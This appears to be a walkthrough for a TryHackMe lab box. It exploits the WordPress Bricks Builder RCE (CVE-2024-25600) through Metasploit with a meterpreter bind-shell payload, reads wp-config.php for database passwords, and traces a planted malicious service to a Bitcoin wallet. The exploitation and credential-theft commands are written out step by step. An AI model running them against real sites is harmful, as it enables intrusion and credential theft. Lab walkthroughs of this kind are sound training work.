### Key Findings

1. **It’s a WordPress Site:** The directories /wp-admin, /wp-content, /wp-includes, and /wp-login.php absolutely confirm this is running WordPress.
Given the name of the TryHackMe box and the blog post title, it is highly likely that this WordPress site is using a vulnerable version of the Bricks theme.

- Search for an exploit using SearchSploit: searchsploit bricks builder
1. Search for the CVE:
    ```
    search CVE-2024-25600
    ```
    
2. You should see a module named exploit/multi/http/wp_bricks_builder_rce. Load it:
    ```
    use 0
    ```
    
3. Set up the required options. Since the site is using HTTPS on port 443, we need to configure that:
    ```
    set RHOSTS bricks.thm
    set RPORT 443
    set SSL true
    set LHOST tun0
    ```

In your msfconsole, run these exact commands:

1. Change the payload to a bind shell:
    ```
    set payload php/meterpreter/bind_tcp
    ```
    
2. You no longer need LHOST for a bind shell. Run the exploit:
    
    ```
    run
    ```
    ### Steal the Database Credentials

The wp-config.php file is the holy grail of a WordPress directory. It contains the plaintext usernames and passwords for the MySQL database.  
Read it and look for the DB_USER and DB_PASSWORD fields:

codeBash

```
cat wp-config.php
```

(Make sure to copy these credentials to a notepad, you will likely need them later—either to log into the /phpmyadmin page we found earlier, or to switch to another user on the server!)

### 3. Investigate the Suspicious kod Directory

Standard WordPress installations do not have a folder named kod. This was put here by the creator of the box. Let's see what's inside it:
```
ls kod
```

### 4. Check Who You Are

It's important to know what user account you have compromised. Usually, web exploits give you a low-privileged user like www-data or apache.  
Run this to see your user:
```
getuid
```

**Drop into a system shell**  
Right now you are in a meterpreter > prompt. Type shell to get a normal Linux command line:
```
shell
```

**2. List the running services**  
The attacker installed a malicious service to ensure their malware keeps running. Run this command to list all running services:
```
systemctl list-units --type=service --state=running
```

If you look closely at the output, you will see a service that stands out on a web server: **ubuntu.service**.

**3. Investigate the service**  
Let's see exactly what that fake "ubuntu" service is executing behind the scenes:
```
systemctl cat ubuntu.service
```

You will see that it is executing a hidden binary located at /lib/NetworkManager/nm-inet-dialog

**Go to the hidden directory where the malware lives:**
```
cd /lib/NetworkManager
```
 
```
cat inet.conf
```
Copy that long id string and head over to **CyberChef** ([https://gchq.github.io/CyberChef/](https://www.google.com/url?sa=E&q=https%3A%2F%2Fgchq.github.io%2FCyberChef%2F)) in your browser.

1. Paste the string into the "Input" box.
2. Search for the **"Magic"** recipe on the left and drag it into the Recipe area.
3. CyberChef will automatically decode the string into a valid Bitcoin wallet address (it should start with bc1q...).

Lockbit